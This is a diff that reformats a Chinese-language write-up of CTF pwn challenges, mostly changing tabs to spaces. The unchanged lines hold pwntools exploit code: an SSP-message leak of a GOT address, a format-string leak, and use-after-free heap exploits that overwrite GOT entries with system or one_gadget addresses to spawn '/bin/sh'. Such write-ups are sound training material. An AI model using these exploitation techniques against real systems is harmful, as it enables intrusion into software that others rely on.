@@ -23,8 +23,8 @@ categories:
 
 ```python
 def ssp(payload):
-	sla('flag', 'a'*0x128 + payload)
-	ru('detected ***:')
+    sla('flag', 'a'*0x128 + payload)
+    ru('detected ***:')
 
 ssp(p64(elf.got['puts']))
 puts = uu64(r(6))
@@ -124,9 +124,9 @@ free(2)
 ```python
 ru('?\n')
 def exec_fmt(payload):
-	sl(payload)
-	info = r()
-	return info
+    sl(payload)
+    info = r()
+    return info
 auto = FmtStr(exec_fmt)
 
 sl(p32(elf.got['printf']) + '%6$s')
@@ -141,6 +141,7 @@ sl('/bin/sh\x00')
 ## fgo
 
 入门级堆题，直接 uaf 即可。解法可以参考 `hitcontraining_hacknote`。
+
 ```python
 add(0x20)
 add(0x20)
@@ -183,39 +184,38 @@ edit(0,0x8,p64(system))
 sla(':', '/bin/sh\x00')
 ```
 
-
 ## semifinal_pwn1
 
 本题功能比较复杂，关键在于自己可以添加自己为好友，然后删除自己时就可以释放内存。而每个用户都会分配一块 0x130 的 chunk，释放后进入 unsorted bin。随后就可以利用 uaf 泄露 libc 并借助 `update` 功能覆盖 got 表。
 
 ```python
 def reg(size,name):
-	sla('choice:',2)
-	sla(':',size)
-	sla(':',name)
-	sla(':',20)
-	sla(':','desc')
+    sla('choice:',2)
+    sla(':',size)
+    sla(':',name)
+    sla(':',20)
+    sla(':','desc')
 
 def login(name):
-	sla('choice:',1)
-	sla(':',name)
+    sla('choice:',1)
+    sla(':',name)
 
 def logout():
-	sla('choice:',6)
+    sla('choice:',6)
 
 def add_free(name,choice):
-	sla('choice:',3)
-	sla(':',name)
-	sla('(a/d)', choice)
+    sla('choice:',3)
+    sla(':',name)
+    sla('(a/d)', choice)
 
 def view_profile():
-	sla('choice:',1)
+    sla('choice:',1)
 
 def edit(name):
-	sla('choice:',2)
-	sa(':', name)
-	sla(':',20)
-	sla(':','desc')
+    sla('choice:',2)
+    sa(':', name)
+    sla(':',20)
+    sla(':','desc')
 
 reg(8,'a'*6)
 reg(8,'b'*6)
@@ -235,10 +235,10 @@ login(p64(puts))
 edit(p64(base+0x4526a)[:-2])
 ```
 
-
 ## semifinal_pwn2
 
 这题比较有意思，程序是一个 brainfuck 解释器，规则是：
+
 - `<`： `p--`
 - `>`： `p++`
 - `.`： `putc(*p)`
@@ -262,7 +262,7 @@ leak('base',base)
 one = p64(base + 0xf1147)
 
 for i in range(6):
-	s(one[i])
+    s(one[i])
 ```
 
 ## semifinal_pwn3
@@ -273,7 +273,7 @@ for i in range(6):
 
 ```python
 def clean():
-	sla('choice :', 4)
+    sla('choice :', 4)
 
 add(0x80)
 add(0x60)
